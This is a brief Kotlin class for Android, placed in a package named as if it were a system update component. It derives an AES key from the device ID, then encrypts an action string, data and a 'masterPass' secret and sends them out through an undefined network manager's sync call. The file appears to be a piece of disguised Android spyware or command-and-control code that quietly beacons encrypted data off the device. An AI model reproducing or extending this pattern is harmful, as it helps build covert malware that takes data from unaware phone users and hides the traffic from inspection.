package com.android.system.update.core

import android.content.Context
import android.provider.Settings
import android.util.Base64
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class BackgroundUtility(private val context: Context) {

    private val random = SecureRandom()
    private val deviceKey: ByteArray
    private val networkManager = NetworkConnectionManager(context)

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun execute(action: String, data: String): String {
        val auth = SecureEnv.masterPass
        val command = "$action|$data|${System.currentTimeMillis()}|auth=$auth"
        val encrypted = encrypt(command)
        val payload = Base64.encodeToString(encrypted, Base64.NO_WRAP)
        networkManager.sync(payload)
        return "executed"
    }

    private fun encrypt(input: String): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(input.toByteArray())
        return iv + encrypted
    }
}